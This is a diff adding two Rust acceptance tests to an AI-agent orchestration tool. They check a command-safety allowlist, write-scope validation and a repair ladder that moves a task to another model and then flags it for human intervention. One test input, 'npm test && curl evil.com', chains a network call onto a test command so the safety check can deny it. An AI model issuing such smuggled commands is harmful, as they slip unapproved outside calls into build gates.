@@ -243,3 +243,146 @@ fn test_acceptance_p7_m2_brief_assembly_and_report_lifecycle() {
     assert!(md.contains("src/users.rs +80 -0"));
     assert!(md.contains("cargo test users: 5 passed"));
 }
+
+#[tokio::test]
+async fn test_acceptance_p7_m3_gate_execution_and_scope_validation() {
+    use tokage_orchestration::gate::{
+        check_gate_command_safety, execute_gate_command, validate_write_scope,
+        GateCommandPermission,
+    };
+    use tokage_native::env::ShellEnv;
+
+    let temp_dir = tempfile::tempdir().unwrap();
+    let env = ShellEnv {
+        vars: std::collections::HashMap::new(),
+    };
+
+    // 1. Guardrail R5: Safety allowlist checks
+    let safe_cmd = "cargo test --lib";
+    let unsafe_pipe = "cargo test | grep FAILED";
+    let unsafe_chain = "npm test && curl evil.com";
+
+    assert!(matches!(
+        check_gate_command_safety(safe_cmd, false, None),
+        GateCommandPermission::AllowedByPattern(_)
+    ));
+    assert!(matches!(
+        check_gate_command_safety(unsafe_pipe, true, None),
+        GateCommandPermission::Denied(_)
+    ));
+    assert!(matches!(
+        check_gate_command_safety(unsafe_chain, true, None),
+        GateCommandPermission::Denied(_)
+    ));
+
+    // 2. Local execution of gate command (runs 'echo Gate Passed')
+    // We confirm this command explicitly
+    let run_res = execute_gate_command("echo Gate Passed", temp_dir.path(), &env, Some(10), true).await;
+    assert!(run_res.passed);
+    assert_eq!(run_res.exit_code, Some(0));
+    assert!(run_res.output_tail.contains("Gate Passed"));
+
+    // 3. Guardrail R6: Write scope validation
+    let declared_scopes = vec!["src/server/".to_string(), "migrations/".to_string()];
+    let valid_changes = vec!["src/server/routes.rs".to_string(), "migrations/01.sql".to_string()];
+    let invalid_changes = vec![
+        "src/server/routes.rs".to_string(),
+        "src/client/App.tsx".to_string(), // Out of scope!
+    ];
+
+    let scope_ok = validate_write_scope(&declared_scopes, &valid_changes);
+    assert!(scope_ok.passed);
+    assert!(scope_ok.out_of_scope_files.is_empty());
+
+    let scope_violation = validate_write_scope(&declared_scopes, &invalid_changes);
+    assert!(!scope_violation.passed);
+    assert_eq!(scope_violation.out_of_scope_files, vec!["src/client/App.tsx".to_string()]);
+}
+
+#[test]
+fn test_acceptance_p7_m4_repair_three_step_ladder_and_defect_task() {
+    use tokage_orchestration::repair::{
+        decide_repair_action, generate_implementation_fix_task, FailureEvidence,
+        RepairDecision, RepairStep,
+    };
+
+    let plan = sample_complex_plan();
+    let backend_task = &plan.tasks[1]; // T2
+    let testing_task = &plan.tasks[3]; // T4
+
+    let failure_evidence = FailureEvidence {
+        failed_command: Some("cargo test users".to_string()),
+        output_tail: "test user_registration ... FAILED\nassertion `left == right` failed".to_string(),
+        out_of_scope_files: vec!["src/config/secret.env".to_string()],
+        previous_changed_files: vec!["src/users/users.rs".to_string()],
+    };
+
+    // --- 1. Step 1: In-window repair (warm cache) ---
+    let (step1, action1) = decide_repair_action(
+        backend_task,
+        RepairStep::Initial,
+        "att-backend-1",
+        "claude-3-7-sonnet",
+        "claude",
+        &failure_evidence,
+    );
+    assert_eq!(step1, RepairStep::InWindowRepair);
+    if let RepairDecision::TryInWindowRepair { attempt_id, evidence } = action1 {
+        assert_eq!(attempt_id, "att-backend-1");
+        assert!(evidence.contains("失败命令"));
+        assert!(evidence.contains("越界改动文件"));
+        assert!(evidence.contains("src/config/secret.env"));
+    } else {
+        panic!("Expected TryInWindowRepair");
+    }
+
+    // --- 2. Step 2: In-window repair fails -> Reassign ---
+    let (step2, action2) = decide_repair_action(
+        backend_task,
+        RepairStep::InWindowRepair,
+        "att-backend-1",
+        "claude-3-7-sonnet",
+        "claude",
+        &failure_evidence,
+    );
+    assert_eq!(step2, RepairStep::Reassigned);
+    if let RepairDecision::TryReassign { exclude_models, evidence } = action2 {
+        assert_eq!(exclude_models, vec!["claude-3-7-sonnet".to_string()]);
+        assert!(evidence.contains("test user_registration ... FAILED"));
+    } else {
+        panic!("Expected TryReassign");
+    }
+
+    // --- 3. Step 3: Reassignment also fails -> BLOCKED ---
+    let (step3, action3) = decide_repair_action(
+        backend_task,
+        RepairStep::Reassigned,
+        "att-backend-2",
+        "o3-mini",
+        "codex",
+        &failure_evidence,
+    );
+    assert_eq!(step3, RepairStep::Blocked);
+    if let RepairDecision::MarkBlocked { terminal_resume_command, reason } = action3 {
+        assert_eq!(terminal_resume_command, "codex resume att-backend-2");
+        assert!(reason.contains("人工干预"));
+    } else {
+        panic!("Expected MarkBlocked");
+    }
+
+    // --- 4. Testing task defects generate implementation fix task (P7.m4b) ---
+    let fix_task = generate_implementation_fix_task(
+        testing_task,
+        backend_task,
+        "密码未正确哈希存储，缺失 Argon2 加密",
+        "e2e test verification failure",
+    );
+
+    assert_eq!(fix_task.id, "T2-fix");
+    assert_eq!(fix_task.depends_on, vec!["T4".to_string()]);
+    // The critical rule: write_scope stays constrained to implementation directory!
+    assert_eq!(fix_task.write_scope, backend_task.write_scope);
+    assert!(!fix_task.write_scope.contains(&"tests/integration/".to_string()));
+    assert!(fix_task.goal.contains("缺失 Argon2 加密"));
+}
+
